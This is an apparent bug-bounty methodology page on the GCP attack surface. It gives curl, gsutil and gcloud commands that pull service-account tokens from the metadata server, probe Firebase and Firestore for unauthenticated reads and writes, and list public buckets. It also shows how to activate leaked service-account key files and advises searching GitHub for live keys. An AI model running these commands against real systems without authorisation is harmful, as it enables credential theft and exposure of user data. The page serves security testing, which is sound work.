> Source: https://bugbounty.info/Attack-Surface/Cloud/GCP/index

# GCP Attack Surface

GCP is the least common cloud provider in bug bounty but some of the highest-value targets run on it: Google itself, media companies, startups that drink the Google Kool-Aid. Firebase is where I spend most of my time on GCP - it's absurdly easy to misconfigure and the scale of exposed data can be massive. Service account key abuse is the other big one.

## Core Services to Target

| Service | What I'm Looking For |
| --- | --- |
| Cloud Storage | Public buckets, uniform bucket-level access misconfiguration |
| Firebase RTDB | Unauthenticated read/write, rules that don't check auth |
| Firestore | Overly permissive security rules |
| Service Accounts | Exported key files, metadata-accessible tokens |
| Cloud Functions | Unauthenticated invocation, env var secrets |
| GKE | Misconfigured cluster RBAC, public dashboards |
| Secret Manager | Over-permissive service account access |

## SSRF to GCP Metadata

```bash
# Requires Metadata-Flavor: Google header
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/"
 
# Get service account token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
 
# List service accounts on the instance
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
 
# Get all attributes (may include startup scripts with secrets)
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true"
```

The token returned is an OAuth2 access token. Use it with `gcloud` or the REST API directly.

## Firebase: Worth Special Attention

Firebase is deployed on hundreds of thousands of apps and the default rules are often either wide open or inadequately scoped. This is my first stop on any mobile app target.

### Finding Firebase

```bash
# In mobile apps or JS source, look for:
# https://PROJECT_ID.firebaseio.com
# "databaseURL": "https://PROJECT-default-rtdb.firebaseio.com"
# "projectId": "my-app-12345"
```

### Testing RTDB Rules

```bash
# Test unauthenticated read
curl "https://PROJECT-default-rtdb.firebaseio.com/.json"
curl "https://PROJECT-default-rtdb.firebaseio.com/users.json"
curl "https://PROJECT-default-rtdb.firebaseio.com/messages.json"
 
# Test unauthenticated write
curl -X PUT "https://PROJECT-default-rtdb.firebaseio.com/test.json" \
  -d '"bugbounty_test"'
 
# Get rules (sometimes readable without auth - often not)
curl "https://PROJECT-default-rtdb.firebaseio.com/.settings/rules.json"
```

The nuclear bad rule is `".read": true, ".write": true` at the root. Also watch for rules like `".read": "auth != null"` where you can self-register and then read everyone's data.

### Firestore Rules Testing

Firestore security rules are trickier to test but the Firebase Rules Playground in the console (if you have any access) or the REST API works:

```bash
# Read a collection without auth
curl "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents/COLLECTION"
 
# With an auth token (from self-registered user)
curl -H "Authorization: Bearer ID_TOKEN" \
  "https://firestore.googleapis.com/v1/projects/PROJECT_ID/databases/(default)/documents/users"
```

Common misconfig: rules allow any authenticated user to read any document, so self-registering gives you access to all user data.

## Cloud Storage

```bash
# Check if a bucket is public
gsutil ls gs://BUCKET_NAME  # or:
curl https://storage.googleapis.com/BUCKET_NAME/
 
# List objects
curl "https://storage.googleapis.com/storage/v1/b/BUCKET_NAME/o"
 
# Check bucket IAM (needs auth)
gsutil iam get gs://BUCKET_NAME
```

GCP's "allUsers" and "allAuthenticatedUsers" are the equivalents of S3's public ACLs. `allAuthenticatedUsers` is deceptive - it means any Google account, not just users of that app.

## Service Account Key Files

Service account JSON key files are the GCP equivalent of AWS access keys. They're persistent (don't expire unless revoked) and leak constantly into repos.

```bash
# A leaked key file looks like:
# {
#   "type": "service_account",
#   "project_id": "...",
#   "private_key_id": "...",
#   "private_key": "-----BEGIN RSA PRIVATE KEY-----\n...",
#   "client_email": "...",
# }
 
# Activate and use it
gcloud auth activate-service-account --key-file=leaked_key.json
gcloud projects list
gcloud storage ls
```

Search GitHub and GitLab for `"type": "service_account"` - you'll find live keys.

## Cloud Functions

```bash
# List functions (with appropriate permissions)
gcloud functions list
 
# Check if a function is publicly invocable
gcloud functions get-iam-policy FUNCTION_NAME
# Look for: members: allUsers, role: roles/cloudfunctions.invoker
 
# Invoke it
curl https://REGION-PROJECT.cloudfunctions.net/FUNCTION_NAME
```

## Related

- [Cloud Overview](../../../Attack-Surface/Cloud/)
- [Multi-Cloud](../../../Attack-Surface/Cloud/Multi-Cloud/) - Firebase rules testing patterns
- [CD](../../../Attack-Surface/CI-CD/) - GCP service account keys in CI pipelines
